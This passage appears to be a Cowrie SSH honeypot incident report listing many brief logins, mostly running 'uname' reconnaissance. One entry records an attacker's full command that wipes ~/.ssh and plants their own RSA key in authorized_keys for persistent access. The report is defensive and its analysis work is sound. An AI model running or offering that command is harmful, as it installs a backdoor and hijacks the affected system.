- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac3d513ea333

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:57 |
| **Last Seen** | 2026-07-19 09:57 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:57:32` | `cowrie.session.connect` |
| `2026-07-19 09:57:33` | `cowrie.client.version` |
| `2026-07-19 09:57:33` | `cowrie.client.kex` |
| `2026-07-19 09:57:40` | `cowrie.login.success` |
| `2026-07-19 09:57:42` | `cowrie.session.params` |
| `2026-07-19 09:57:42` | `cowrie.command.input` |
| `2026-07-19 09:57:44` | `cowrie.log.closed` |
| `2026-07-19 09:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-500bee82b5c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:57 |
| **Last Seen** | 2026-07-19 09:57 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:57:42` | `cowrie.session.connect` |
| `2026-07-19 09:57:44` | `cowrie.client.version` |
| `2026-07-19 09:57:44` | `cowrie.client.kex` |
| `2026-07-19 09:57:52` | `cowrie.login.success` |
| `2026-07-19 09:57:55` | `cowrie.session.params` |
| `2026-07-19 09:57:55` | `cowrie.command.input` |
| `2026-07-19 09:57:58` | `cowrie.log.closed` |
| `2026-07-19 09:57:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bde379d62f0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:57 |
| **Last Seen** | 2026-07-19 09:58 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:57:54` | `cowrie.session.connect` |
| `2026-07-19 09:57:55` | `cowrie.client.version` |
| `2026-07-19 09:57:55` | `cowrie.client.kex` |
| `2026-07-19 09:58:01` | `cowrie.login.success` |
| `2026-07-19 09:58:04` | `cowrie.session.params` |
| `2026-07-19 09:58:04` | `cowrie.command.input` |
| `2026-07-19 09:58:05` | `cowrie.log.closed` |
| `2026-07-19 09:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3d059e4abe7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:58 |
| **Last Seen** | 2026-07-19 09:58 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:58:06` | `cowrie.session.connect` |
| `2026-07-19 09:58:07` | `cowrie.client.version` |
| `2026-07-19 09:58:07` | `cowrie.client.kex` |
| `2026-07-19 09:58:16` | `cowrie.login.success` |
| `2026-07-19 09:58:20` | `cowrie.session.params` |
| `2026-07-19 09:58:20` | `cowrie.command.input` |
| `2026-07-19 09:58:22` | `cowrie.log.closed` |
| `2026-07-19 09:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db68f6c856c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:58 |
| **Last Seen** | 2026-07-19 09:58 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:58:13` | `cowrie.session.connect` |
| `2026-07-19 09:58:16` | `cowrie.client.version` |
| `2026-07-19 09:58:16` | `cowrie.client.kex` |
| `2026-07-19 09:58:26` | `cowrie.login.success` |
| `2026-07-19 09:58:30` | `cowrie.session.params` |
| `2026-07-19 09:58:30` | `cowrie.command.input` |
| `2026-07-19 09:58:33` | `cowrie.log.closed` |
| `2026-07-19 09:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d71106812b5c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:58 |
| **Last Seen** | 2026-07-19 09:58 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:58:27` | `cowrie.session.connect` |
| `2026-07-19 09:58:29` | `cowrie.client.version` |
| `2026-07-19 09:58:29` | `cowrie.client.kex` |
| `2026-07-19 09:58:40` | `cowrie.login.success` |
| `2026-07-19 09:58:44` | `cowrie.session.params` |
| `2026-07-19 09:58:44` | `cowrie.command.input` |
| `2026-07-19 09:58:45` | `cowrie.log.closed` |
| `2026-07-19 09:58:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd8caa6cbfe4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:58 |
| **Last Seen** | 2026-07-19 09:58 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:58:38` | `cowrie.session.connect` |
| `2026-07-19 09:58:40` | `cowrie.client.version` |
| `2026-07-19 09:58:40` | `cowrie.client.kex` |
| `2026-07-19 09:58:47` | `cowrie.login.success` |
| `2026-07-19 09:58:51` | `cowrie.session.params` |
| `2026-07-19 09:58:51` | `cowrie.command.input` |
| `2026-07-19 09:58:53` | `cowrie.log.closed` |
| `2026-07-19 09:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e9651a3c49a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:58 |
| **Last Seen** | 2026-07-19 09:59 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:58:50` | `cowrie.session.connect` |
| `2026-07-19 09:58:51` | `cowrie.client.version` |
| `2026-07-19 09:58:51` | `cowrie.client.kex` |
| `2026-07-19 09:58:57` | `cowrie.login.success` |
| `2026-07-19 09:59:00` | `cowrie.session.params` |
| `2026-07-19 09:59:00` | `cowrie.command.input` |
| `2026-07-19 09:59:03` | `cowrie.log.closed` |
| `2026-07-19 09:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1514e1f2c752

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:59 |
| **Last Seen** | 2026-07-19 09:59 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:59:01` | `cowrie.session.connect` |
| `2026-07-19 09:59:02` | `cowrie.client.version` |
| `2026-07-19 09:59:02` | `cowrie.client.kex` |
| `2026-07-19 09:59:08` | `cowrie.login.success` |
| `2026-07-19 09:59:11` | `cowrie.session.params` |
| `2026-07-19 09:59:11` | `cowrie.command.input` |
| `2026-07-19 09:59:13` | `cowrie.log.closed` |
| `2026-07-19 09:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d03c32678940

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:59 |
| **Last Seen** | 2026-07-19 09:59 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:59:11` | `cowrie.session.connect` |
| `2026-07-19 09:59:13` | `cowrie.client.version` |
| `2026-07-19 09:59:13` | `cowrie.client.kex` |
| `2026-07-19 09:59:21` | `cowrie.login.success` |
| `2026-07-19 09:59:24` | `cowrie.session.params` |
| `2026-07-19 09:59:24` | `cowrie.command.input` |
| `2026-07-19 09:59:25` | `cowrie.log.closed` |
| `2026-07-19 09:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d7b38d86410

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:59 |
| **Last Seen** | 2026-07-19 09:59 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:59:24` | `cowrie.session.connect` |
| `2026-07-19 09:59:24` | `cowrie.client.version` |
| `2026-07-19 09:59:25` | `cowrie.client.kex` |
| `2026-07-19 09:59:32` | `cowrie.login.success` |
| `2026-07-19 09:59:36` | `cowrie.session.params` |
| `2026-07-19 09:59:36` | `cowrie.command.input` |
| `2026-07-19 09:59:38` | `cowrie.log.closed` |
| `2026-07-19 09:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6b47284a577

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:59 |
| **Last Seen** | 2026-07-19 09:59 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:59:32` | `cowrie.session.connect` |
| `2026-07-19 09:59:34` | `cowrie.client.version` |
| `2026-07-19 09:59:34` | `cowrie.client.kex` |
| `2026-07-19 09:59:42` | `cowrie.login.success` |
| `2026-07-19 09:59:46` | `cowrie.session.params` |
| `2026-07-19 09:59:46` | `cowrie.command.input` |
| `2026-07-19 09:59:48` | `cowrie.log.closed` |
| `2026-07-19 09:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5221d76d041

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:59 |
| **Last Seen** | 2026-07-19 09:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:59:43` | `cowrie.session.connect` |
| `2026-07-19 09:59:45` | `cowrie.client.version` |
| `2026-07-19 09:59:45` | `cowrie.client.kex` |
| `2026-07-19 09:59:51` | `cowrie.login.success` |
| `2026-07-19 09:59:53` | `cowrie.session.params` |
| `2026-07-19 09:59:53` | `cowrie.command.input` |
| `2026-07-19 09:59:54` | `cowrie.log.closed` |
| `2026-07-19 09:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acc900aeec45

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:59 |
| **Last Seen** | 2026-07-19 10:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:59:56` | `cowrie.session.connect` |
| `2026-07-19 09:59:57` | `cowrie.client.version` |
| `2026-07-19 09:59:57` | `cowrie.client.kex` |
| `2026-07-19 10:00:01` | `cowrie.login.success` |
| `2026-07-19 10:00:02` | `cowrie.session.params` |
| `2026-07-19 10:00:02` | `cowrie.command.input` |
| `2026-07-19 10:00:03` | `cowrie.log.closed` |
| `2026-07-19 10:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feb2c962db69

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:00 |
| **Last Seen** | 2026-07-19 10:00 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:00:07` | `cowrie.session.connect` |
| `2026-07-19 10:00:08` | `cowrie.client.version` |
| `2026-07-19 10:00:08` | `cowrie.client.kex` |
| `2026-07-19 10:00:13` | `cowrie.login.success` |
| `2026-07-19 10:00:16` | `cowrie.session.params` |
| `2026-07-19 10:00:16` | `cowrie.command.input` |
| `2026-07-19 10:00:18` | `cowrie.log.closed` |
| `2026-07-19 10:00:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ae05f7d3c30

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:00 |
| **Last Seen** | 2026-07-19 10:00 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:00:17` | `cowrie.session.connect` |
| `2026-07-19 10:00:19` | `cowrie.client.version` |
| `2026-07-19 10:00:19` | `cowrie.client.kex` |
| `2026-07-19 10:00:29` | `cowrie.login.success` |
| `2026-07-19 10:00:36` | `cowrie.session.params` |
| `2026-07-19 10:00:36` | `cowrie.command.input` |
| `2026-07-19 10:00:38` | `cowrie.log.closed` |
| `2026-07-19 10:00:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54c67b5ec152

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:00 |
| **Last Seen** | 2026-07-19 10:00 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:00:27` | `cowrie.session.connect` |
| `2026-07-19 10:00:29` | `cowrie.client.version` |
| `2026-07-19 10:00:29` | `cowrie.client.kex` |
| `2026-07-19 10:00:40` | `cowrie.login.success` |
| `2026-07-19 10:00:47` | `cowrie.session.params` |
| `2026-07-19 10:00:47` | `cowrie.command.input` |
| `2026-07-19 10:00:51` | `cowrie.log.closed` |
| `2026-07-19 10:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b70053354f61

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:00 |
| **Last Seen** | 2026-07-19 10:01 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:00:39` | `cowrie.session.connect` |
| `2026-07-19 10:00:41` | `cowrie.client.version` |
| `2026-07-19 10:00:41` | `cowrie.client.kex` |
| `2026-07-19 10:00:54` | `cowrie.login.success` |
| `2026-07-19 10:00:57` | `cowrie.session.params` |
| `2026-07-19 10:00:57` | `cowrie.command.input` |
| `2026-07-19 10:01:00` | `cowrie.log.closed` |
| `2026-07-19 10:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92fdd3d86645

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:00 |
| **Last Seen** | 2026-07-19 10:01 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:00:54` | `cowrie.session.connect` |
| `2026-07-19 10:00:55` | `cowrie.client.version` |
| `2026-07-19 10:00:55` | `cowrie.client.kex` |
| `2026-07-19 10:01:06` | `cowrie.login.success` |
| `2026-07-19 10:01:10` | `cowrie.session.params` |
| `2026-07-19 10:01:10` | `cowrie.command.input` |
| `2026-07-19 10:01:13` | `cowrie.log.closed` |
| `2026-07-19 10:01:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-497c34b76a13

| Field | Detail |
|---|---|
| **Source IP** | `209.99.189[.]177` |
| **First Seen** | 2026-07-19 10:01 |
| **Last Seen** | 2026-07-19 10:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:01:04` | `cowrie.session.connect` |
| `2026-07-19 10:01:04` | `cowrie.client.version` |
| `2026-07-19 10:01:04` | `cowrie.client.kex` |
| `2026-07-19 10:01:05` | `cowrie.login.success` |
| `2026-07-19 10:01:05` | `cowrie.session.params` |
| `2026-07-19 10:01:05` | `cowrie.command.input` |
| `2026-07-19 10:01:05` | `cowrie.command.failed` |
| `2026-07-19 10:01:06` | `cowrie.log.closed` |
| `2026-07-19 10:01:06` | `cowrie.session.params` |
| `2026-07-19 10:01:06` | `cowrie.command.input` |
| `2026-07-19 10:01:06` | `cowrie.session.file_download` |
| `2026-07-19 10:01:06` | `cowrie.log.closed` |
| `2026-07-19 10:01:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.189[.]177` to AbuseIPDB if not already reported
- [ ] Block `209.99.189[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5860a5a5149

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:01 |
| **Last Seen** | 2026-07-19 10:01 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:01:06` | `cowrie.session.connect` |
| `2026-07-19 10:01:08` | `cowrie.client.version` |
| `2026-07-19 10:01:08` | `cowrie.client.kex` |
| `2026-07-19 10:01:18` | `cowrie.login.success` |
| `2026-07-19 10:01:26` | `cowrie.session.params` |
| `2026-07-19 10:01:26` | `cowrie.command.input` |
| `2026-07-19 10:01:27` | `cowrie.log.closed` |
| `2026-07-19 10:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-132bced4e4d8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.189[.]177` |
| **First Seen** | 2026-07-19 10:01 |
| **Last Seen** | 2026-07-19 10:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:01:07` | `cowrie.session.connect` |
| `2026-07-19 10:01:07` | `cowrie.client.version` |
| `2026-07-19 10:01:07` | `cowrie.client.kex` |
| `2026-07-19 10:01:07` | `cowrie.login.success` |
| `2026-07-19 10:01:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.189[.]177` to AbuseIPDB if not already reported
- [ ] Block `209.99.189[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55c39aeadb9c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.189[.]177` |
| **First Seen** | 2026-07-19 10:01 |
| **Last Seen** | 2026-07-19 10:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:01:07` | `cowrie.session.connect` |
| `2026-07-19 10:01:07` | `cowrie.client.version` |
| `2026-07-19 10:01:07` | `cowrie.client.kex` |
| `2026-07-19 10:01:08` | `cowrie.login.success` |
| `2026-07-19 10:01:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.189[.]177` to AbuseIPDB if not already reported
- [ ] Block `209.99.189[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e9880f7adb6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:01 |
| **Last Seen** | 2026-07-19 10:01 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:01:15` | `cowrie.session.connect` |
| `2026-07-19 10:01:18` | `cowrie.client.version` |
| `2026-07-19 10:01:18` | `cowrie.client.kex` |
| `2026-07-19 10:01:28` | `cowrie.login.success` |
| `2026-07-19 10:01:31` | `cowrie.session.params` |
| `2026-07-19 10:01:31` | `cowrie.command.input` |
| `2026-07-19 10:01:33` | `cowrie.log.closed` |
| `2026-07-19 10:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d04deec3a083

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:01 |
| **Last Seen** | 2026-07-19 10:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:01:32` | `cowrie.session.connect` |
| `2026-07-19 10:01:33` | `cowrie.client.version` |
| `2026-07-19 10:01:33` | `cowrie.client.kex` |
| `2026-07-19 10:01:38` | `cowrie.login.success` |
| `2026-07-19 10:01:41` | `cowrie.session.params` |
| `2026-07-19 10:01:41` | `cowrie.command.input` |
| `2026-07-19 10:01:42` | `cowrie.log.closed` |
| `2026-07-19 10:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
